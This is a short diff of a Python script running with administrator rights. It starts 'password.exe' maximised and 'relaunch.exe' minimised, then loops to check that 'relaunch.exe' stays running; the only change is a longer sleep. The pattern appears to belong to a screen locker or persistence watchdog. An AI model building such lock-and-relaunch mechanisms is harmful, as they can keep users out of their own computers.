@@ -13,7 +13,7 @@ if is_admin(): # Si l'utilisateur est administrateur
     os.system("@ECHO OFF")
     os.system("start /MAX password.exe")
     os.system("start /MIN relaunch.exe")
-    time.sleep(1.5)
+    time.sleep(2.5)
     
     while True:
         if "relaunch.exe" not in (p.name() for p in psutil.process_iter()):
